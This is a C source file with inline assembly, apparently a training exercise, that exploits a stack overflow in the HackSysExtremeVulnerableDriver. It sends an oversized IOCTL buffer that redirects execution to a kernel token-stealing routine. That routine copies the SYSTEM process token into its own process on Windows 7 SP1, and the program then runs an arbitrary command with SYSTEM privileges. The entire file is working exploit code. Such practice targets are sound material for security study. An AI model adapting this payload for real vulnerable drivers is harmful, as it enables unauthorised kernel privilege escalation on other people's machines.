#include <stdio.h>
#include <Windows.h>




void GetSystemToken() {
	__asm {
		pushad; 保存寄存器

		xor eax, eax				; eax置零
		mov eax, fs: [eax + 124h]	; 获取 nt!_KPCR.PcrbData.CurrentThread
		mov eax, [eax + 050h]		; 获取 nt!_KTHREAD.ApcState.Process
		mov ecx, eax				; 将本进程EPROCESS地址复制到ecx
		mov edx, 4					; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
			mov eax, [eax + 0b8h]; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, 0b8h
			cmp[eax + 0b4h], edx; 获取 nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID; 循环检测是否是SYSTEM进程PID

		mov edx, [eax + 0f8h]; 获取System进程的Token
		mov[ecx + 0f8h], edx; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token

		popad; 恢复寄存器

		xor eax, eax;	eax置零
		add esp, 12
		pop ebp
		ret 8
	}

}



void main(char* argc, char* argv[])
{
	char Buffer[2084];
	HANDLE hDevice;
	DWORD dwRet = 0;

	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
		printf("[-] GetDriver fail!\n");
		return;
	}
	printf("[+] GetDriver Success!\n");

	memset(Buffer, 'A', 2084);
	*(PDWORD)(Buffer + 2080) = (DWORD)&GetSystemToken;

	DeviceIoControl(hDevice, 0x222003, Buffer, 2084, NULL, 0, &dwRet, 0);
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	if (argv[1])
	{
		si = { 0 };
		pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = 1;
		si.wShowWindow = 0;
		CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, 0x10000);
	}


}